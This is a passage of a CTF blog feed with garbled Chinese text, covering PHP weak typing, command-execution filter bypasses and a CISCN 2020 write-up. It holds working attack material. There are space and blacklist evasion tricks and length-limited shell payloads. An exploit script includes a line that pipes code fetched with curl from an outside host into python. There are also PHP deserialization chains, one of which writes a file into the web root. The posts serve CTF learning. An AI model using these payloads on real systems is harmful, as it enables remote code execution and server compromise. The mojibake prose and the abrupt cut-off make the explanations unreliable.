<p> è¾“å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œjsonè§£ç ï¼Œå¦‚æœè§£ç åçš„messageä¸keyå€¼ç›¸åŒï¼Œä¼šå¾—åˆ°flagï¼Œä¸»è¦æ€æƒ³è¿˜æ˜¯å¼±ç±»å‹è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬ä¸çŸ¥é“keyå€¼æ˜¯ä»€ä¹ˆï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ä¸€ä»¶äº‹å°±æ˜¯å®ƒè‚¯å®šæ˜¯å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥äº†ï¼Œä¸Šæ–‡è®²è¿‡ï¼Œä¸¤ä¸ªç­‰å·æ—¶ä¼šè½¬åŒ–æˆåŒä¸€ç±»å‹å†è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥æ„é€ ä¸€ä¸ªæ•°å€¼å°±å¯ä»¥ç›¸ç­‰äº†ã€‚æœ€ç»ˆpayload message={â€œkeyâ€:0}ã€‚ å¦‚æœ$keyä¸­çš„å­—ç¬¦ä¸²å¼€å¤´å¹¶ä¸æ˜¯å­—æ¯ï¼Œåˆ™éœ€è¦æˆ‘ä»¬å»çˆ†ç ´ã€‚</p>
<p><a href="https://www.cnblogs.com/anbus/p/10000571.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« </a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>å¼±ç±»å‹</tag>
      </tags>
  </entry>
  <entry>
    <title>å‘½ä»¤æ‰§è¡Œä¸ç»•è¿‡</title>
    <url>/2020/06/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-ç©ºæ ¼ç»•è¿‡"><a href="#1-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="1.ç©ºæ ¼ç»•è¿‡"></a>1.ç©ºæ ¼ç»•è¿‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;cat,flag.txt&#125;</span><br><span class="line">cat<span class="variable">$&#123;IFS&#125;</span>flag.txt</span><br><span class="line">cat<span class="variable">$IFS</span><span class="variable">$9flag</span>.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$<span class="string">'\x20flag.txt'</span>&amp;&amp;cat<span class="variable">$kg</span>  //(\x20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼å·§å¦™ç»•è¿‡)</span><br></pre></td></tr></table></figure><a id="more"></a>

<p>$IFSåœ¨linuxä¸‹è¡¨ç¤ºåˆ†éš”ç¬¦ï¼ŒåŠ ä¸€ä¸ª{}å°±å›ºå®šäº†å˜é‡åï¼ŒåŒç†åœ¨åé¢åŠ ä¸ª$å¯ä»¥èµ·åˆ°æˆªæ–­ä½œç”¨ã€‚</p>
<h2 id="2-å‘½ä»¤åˆ†å‰²ç¬¦"><a href="#2-å‘½ä»¤åˆ†å‰²ç¬¦" class="headerlink" title="2.å‘½ä»¤åˆ†å‰²ç¬¦"></a>2.å‘½ä»¤åˆ†å‰²ç¬¦</h2><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">%<span class="number">0</span>a æ¢è¡Œç¬¦</span><br><span class="line">%<span class="number">0</span>d å›è½¦ç¬¦</span><br><span class="line">; è¡¨ç¤ºè¿ç»­æŒ‡ä»¤</span><br><span class="line"><span class="meta">&amp; è¡¨ç¤ºå°†å‰ä¸€ä¸ªå‘½ä»¤è®¾ç½®è¿›å…¥åå°</span></span><br><span class="line"><span class="string">| ç®¡é“ç¬¦ï¼Œå°†å‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥</span></span><br><span class="line"><span class="meta">&amp;&amp; å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡ŒæˆåŠŸæ‰ä¼šæ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</span></span><br><span class="line"><span class="string">|| å‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œå¤±è´¥æ‰ä¼šæ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</span></span><br></pre></td></tr></table></figure>

<h2 id="3-é»‘åå•ç»•è¿‡"><a href="#3-é»‘åå•ç»•è¿‡" class="headerlink" title="3.é»‘åå•ç»•è¿‡"></a>3.é»‘åå•ç»•è¿‡</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span>  //å˜é‡ç»•è¿‡</span><br><span class="line">`<span class="built_in">echo</span> <span class="string">"bHMK"</span> |base64 -d` //base64ç¼–ç </span><br></pre></td></tr></table></figure>

<h2 id="4-çŸ­å‘½ä»¤æ‰§è¡Œ"><a href="#4-çŸ­å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="4.çŸ­å‘½ä»¤æ‰§è¡Œ"></a>4.çŸ­å‘½ä»¤æ‰§è¡Œ</h2><p>å¤§ä½“ä¸Šçš„æƒ³æ³•å°±æ˜¯é€šè¿‡é‡å‘½åæ–‡ä»¶ç»•è¿‡ï¼Œç„¶åé€šè¿‡<code>ls</code>æ¥å°†æ–‡ä»¶åå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œ<code>&gt;</code>è¿™ä¸ªé‡å®šå‘ç¬¦å·å¯ä»¥æ¥åˆ›å»ºæ–‡ä»¶ï¼Œå…¶ä¸­æ–‡ä»¶åæ˜¯<code>&gt;</code>åé¢è·Ÿçš„å‚æ•°ï¼Œç„¶ååˆ›å»ºå‡ºæˆ‘ä»¬ç²¾å¿ƒæ„é€ å¥½çš„å¤šä¸ªæ–‡ä»¶åï¼Œç„¶åé€šè¿‡<code>ls</code>æ‰“å°å‡ºæ¥å†é‡å®šå‘<code>&gt;</code>åˆ°ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ä¸­ï¼Œå°±å¯ä»¥æ‰§è¡Œäº†</p>
<ul>
<li><h3 id="æ‹¼æ¥æ–¹æ³•"><a href="#æ‹¼æ¥æ–¹æ³•" class="headerlink" title="æ‹¼æ¥æ–¹æ³•"></a>æ‹¼æ¥æ–¹æ³•</h3></li>
</ul>
<ol>
<li>ä¸¤ä¸ªåæ–œæ <code>\\</code>ï¼Œè¿™ç§æ–¹æ³•æ˜¯åˆ©ç”¨<code>\</code>æ¥æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­å‰ä¸€ä¸ª<code>\</code>æ˜¯ç”¨æ¥åä¹‰åä¸€ä¸ª<code>\</code>çš„ã€‚è¿™ç§æ–¹æ³•çš„è¯éœ€è¦ç²¾å¿ƒæ„é€ è¾“å…¥ï¼Œåˆ©ç”¨å€’å™æ¥è¾“å…¥ï¼Œç„¶å<code>ls</code>çš„æ—¶å€™éœ€è¦åŠ <code>-t</code>å‚æ•°æ¥æ’åˆ—ä¸€ä¸‹ï¼Œè™½ç„¶æŠ¥é”™äº†ä½†æ˜¯ä¹Ÿæ‰§è¡ŒæˆåŠŸäº†</li>
</ol>
<p><img src="/2020/06/å‘½ä»¤æ‰§è¡Œä¸ç»•è¿‡/image-20200610155026769.png" alt="image-20200610155026769"></p>
<ul>
<li><h4 id="ä¸ƒå­—ç»•è¿‡"><a href="#ä¸ƒå­—ç»•è¿‡" class="headerlink" title="ä¸ƒå­—ç»•è¿‡"></a>ä¸ƒå­—ç»•è¿‡</h4></li>
</ul>
<p>é¢˜ç›®æºç å¦‚ä¸‹</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>)&#123;</span></span><br><span class="line"><span class="php">     <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">&gt;php<span class="string">\\</span></span><br><span class="line">&gt;ell.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> sh<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> -O<span class="string">\\</span></span><br><span class="line">&gt;com<span class="string">\\</span></span><br><span class="line">&gt;idu.<span class="string">\\</span></span><br><span class="line">&gt;<span class="string">\</span> ba<span class="string">\\</span></span><br><span class="line">&gt;wget<span class="string">\\</span></span><br><span class="line">ls -t&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/å‘½ä»¤æ‰§è¡Œä¸ç»•è¿‡/image-20200610172713846.png" alt="image-20200610172713846"></p>
<ul>
<li><h4 id="äº”å­—ç»•è¿‡"><a href="#äº”å­—ç»•è¿‡" class="headerlink" title="äº”å­—ç»•è¿‡"></a>äº”å­—ç»•è¿‡</h4></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºé•¿åº¦è¦å°äº5ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•æ‰§è¡Œ<code>ls -t&gt;a</code></p>
<p>æ‰€ä»¥æ€è·¯æ˜¯å…ˆæ„é€  <code>ls -t&gt;a</code></p>
<p>exp</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="built_in">from</span> <span class="built_in">time</span> import sleep</span><br><span class="line"><span class="built_in">from</span> urllib import <span class="literal">quote</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw&gt;python`</span></span><br><span class="line">    <span class="comment"># curl shell.0xb.pw|python</span></span><br><span class="line">    <span class="string">'&gt;on'</span>, </span><br><span class="line">    <span class="string">'&gt;th\\'</span>, </span><br><span class="line">    <span class="string">'&gt;py\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>, </span><br><span class="line">    <span class="string">'&gt;pw\\'</span>, </span><br><span class="line">    <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>, </span><br><span class="line">    <span class="string">'&gt;l.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;el\\'</span>, </span><br><span class="line">    <span class="string">'&gt;sh\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line">r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    assert <span class="built_in">len</span>(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.<span class="built_in">get</span>(<span class="string">'http://xxx/web1.php/?cmd='</span> + <span class="literal">quote</span>(i) )</span><br><span class="line">    print i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="å››å­—ç»•è¿‡"><a href="#å››å­—ç»•è¿‡" class="headerlink" title="å››å­—ç»•è¿‡"></a>å››å­—ç»•è¿‡</h4></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>æœ€å¤§çš„é—®é¢˜è¿˜æ˜¯<code>ls -t&gt;g</code>è¿™ä¸ªé—®é¢˜</p>
<p><img src="/2020/06/å‘½ä»¤æ‰§è¡Œä¸ç»•è¿‡/image-20200610180226760.png" alt="image-20200610180226760"></p>
<p>è¿™ä¸ªexpçš„æ„é€ éå¸¸çš„ç»†è‡´</p>
<p>é¦–å…ˆæ˜¯ <code>ht-</code>åŠ äº†ä¸ª <code>h</code>å‚æ•°ä½†æ•ˆæœå’Œ <code>-t</code>ä¸€æ · ä½†å¯ä»¥è®© <code>ht-</code>æ’åœ¨<code>sl</code>å‰é¢</p>
<p>é€‰æ‹©<code>dir</code>åˆ—ç›®å½•ï¼Œ<code>dir</code>æ’åœ¨ç¬¬ä¸€ä½ï¼Œ<code>*</code>ç›´æ¥ä¼šæ‰§è¡Œ<code>dir</code>å‘½ä»¤</p>
<p>ä¹‹å <code>rev</code>é€†åºæ–‡ä»¶ã€‚</p>
<p>åé¢éƒ½æ˜¯ä¸€æ ·çš„å°±ä¸è®²äº†</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>ç»•è¿‡</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup</title>
    <url>/2020/08/%E7%AC%AC%E5%8D%81%E4%B8%89%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>æ‰«ç›®å½•æ‹¿æºç </p><p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200824112713676.png" alt="image-20200824112713676"></p><p>wmctf2020 <a href="http://blog.ccreater.top/2020/08/04/wmctf2020/#webweb" target="_blank" rel="noopener">webwebçš„åŸé¢˜</a>ï¼Œç›´æ¥ç”¨expæ‰“</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">  <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span> <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">    <span class="title">protected</span></span><br><span class="line">      $<span class="title">props</span>=["<span class="title">quotekey</span>"=&gt;"<span class="title">call_user_func</span>"],</span><br><span class="line">      $<span class="title">adhoc</span>=["<span class="title">phpinfo</span>"=&gt;["<span class="title">expr</span>"=&gt;""]],</span><br><span class="line">      $<span class="title">db</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span><span class="params">($offset, $value)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span><span class="params">($offset)</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;db = $val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">server</span>="";</span><br><span class="line">    <span class="keyword">public</span> $events;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;events=[<span class="string">"disconnect"</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">""</span>)),<span class="string">"find"</span>)];</span><br><span class="line">      <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">  <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>




<p><a href="https://www.gem-love.com/ctf/2569.html#babyunserialize" target="_blank" rel="noopener">y1ngå¸ˆå‚…</a>æ˜¯å…¨å±€æœç´¢<code>__destruct()</code>ï¼Œåœ¨jig.phpå‘ç°äº†ä»»æ„å†™ï¼Œäºæ˜¯ç›´æ¥gethell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span></span><br><span class="line">        <span class="comment">//! Storage location</span></span><br><span class="line">        $dir = <span class="string">'/var/www/html/'</span>,</span><br><span class="line">        <span class="comment">//! Current storage format</span></span><br><span class="line">        $format = <span class="keyword">self</span>::FORMAT_JSON,</span><br><span class="line">        <span class="comment">//! Jig log</span></span><br><span class="line">        $data = <span class="keyword">array</span>(<span class="string">"info.php"</span>=&gt;<span class="keyword">array</span>(<span class="string">"a"</span>=&gt;<span class="string">"&lt;?php phpinfo();?&gt;"</span>)),</span><br><span class="line">        <span class="comment">//! lazy load/save files</span></span><br><span class="line">        $lazy = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$jig = <span class="keyword">new</span> Jig();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($jig));</span><br></pre></td></tr></table></figure>

<h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'could not fork'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])&amp;&amp;is_string($_GET[<span class="string">'a'</span>])&amp;&amp;!preg_match(<span class="string">"/[:\\\\]|exec|pcntl/i"</span>,$_GET[<span class="string">'a'</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">'a'</span>],[$_GET[<span class="string">'b'</span>],<span class="keyword">false</span>,<span class="keyword">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>phpå¤šè¿›ç¨‹ï¼Œä¸»è¿›ç¨‹ä¼šç­‰å¾…å­è¿›ç¨‹è¿è¡Œç»“æŸï¼Œå­è¿›ç¨‹å¼‚å¸¸é€€å‡ºä¼šè§¦å‘<code>phpinfo()</code>ã€‚<br>ç›´æ¥æ‹¿phpå‡½æ•°åˆ—è¡¨fuzzã€‚</p>
<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/easyphp.jpg" alt="easyphp"></p>
<p>ä»¥ä¸Šå‡½æ•°å‡å¯å¯¼è‡´å­è¿›ç¨‹å¼‚å¸¸é€€å‡ºï¼Œéšä¾¿æ‰¾ä¸€ä¸ªå³å¯ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">a</span>=fsockopen&amp;b=123</span><br></pre></td></tr></table></figure>

<p>æœ¬æ¥æƒ³è‡ªå·±fuzzä¸€ä¸‹çš„ï¼Œä½†ç¯å¢ƒæ²¡äº†ã€‚</p>
<h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>è¦æ±‚ä¸¤ä¸ªå˜é‡é•¿åº¦ä¸èƒ½è¶…è¿‡5ï¼Œä½†md5çš„å€¼åˆè¦ç›¸åŒï¼Œè€Œä¸”å¼ºå¼±æ¯”è¾ƒä¹Ÿä¸èƒ½ç›¸åŒ</p>
<p>è€ƒè„‘æ´</p>
<p>åˆ©ç”¨phpé¢„å®šä¹‰å¸¸é‡ç»•è¿‡</p>
<p>æ¯”å¦‚ M_PI,M_E ,INF,M_LN2</p>
<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200821142717774.png" alt="image-20200821142717774"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $trick1=INF;</span><br><span class="line"><span class="keyword">public</span> $trick2=INF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> trick()) );</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">trick=O%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>trick%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>trick1%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>t</span><br><span class="line">rick2%<span class="number">22</span>%<span class="number">3</span>Bd%<span class="number">3</span>AINF%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>åœ¨<code>/DeveloperControlPanel</code>è·¯ç”±ä¸­å‘ç°</p>
<p>if(Admin[key] === password) æ‰èƒ½å¾—åˆ°flag</p>
<p>åœ¨ <code>/Privilege</code>ä¸‹ï¼Œåˆ©ç”¨setFnè®¾ç½®å€¼</p>
<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200821144143013.png" alt="image-20200821144143013"></p>
<p>ç„¶åæ‰¾äº†ä¸‹set-valueçš„æ¼æ´ï¼Œå‘ç°ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“</p>
<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200821143721692.png" alt="image-20200821143721692"></p>
<p>è€Œ3.0.0 æ­£å¥½æ”¶åˆ°å½±å“</p>
<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200820173333614.png" alt="image-20200820173333614"></p>
<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200820173350849.png" alt="image-20200820173350849"></p>
<h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><h3 id="rceme-1"><a href="#rceme-1" class="headerlink" title="rceme"></a>rceme</h3><p>zzzphpçš„ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ï¼Œä½†<code>danger_key()</code> å¢åŠ äº†ä¸€ä¸ª<code>htmlspecialchars()</code>å‡½æ•°å¯¼è‡´åŸæœ¬çš„payloadå¤±æ•ˆ</p>
<p><img src="/2020/08/ç¬¬åä¸‰å±Šå…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›Writeup/image-20200821144836357.png" alt="image-20200821144836357"></p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. æ­£åˆ™è¿‡æ»¤ç»•è¿‡ï¼š</span><br><span class="line">  å¾ˆå®¹æ˜“çœ‹æ‡‚ï¼Œæ ¼å¼ä¸º&#123;<span class="variable"><span class="keyword">if</span></span>:<span class="variable">payload</span>&#125;&#123;<span class="variable">end</span> <span class="variable"><span class="keyword">if</span></span>&#125;ï¼Œå¯åˆ©ç”¨çš„åœ°æ–¹åœ¨<span class="variable">payload</span>å¤„ã€‚</span><br><span class="line"><span class="number">2</span>. å­—ç¬¦ä¸²è¿‡æ»¤ç»•è¿‡ï¼š</span><br><span class="line">  <span class="function"><span class="title">hex2bin</span>(<span class="title">dechex</span>(<span class="variable">xxx</span>)).hex2bin(<span class="title">dechex</span>(<span class="variable">xxx</span>))</span></span><br><span class="line"><span class="number">3</span>. æ‹¼æ¥å­—ç¬¦ä¸²æ‰§è¡Œå‘½ä»¤</span><br><span class="line">  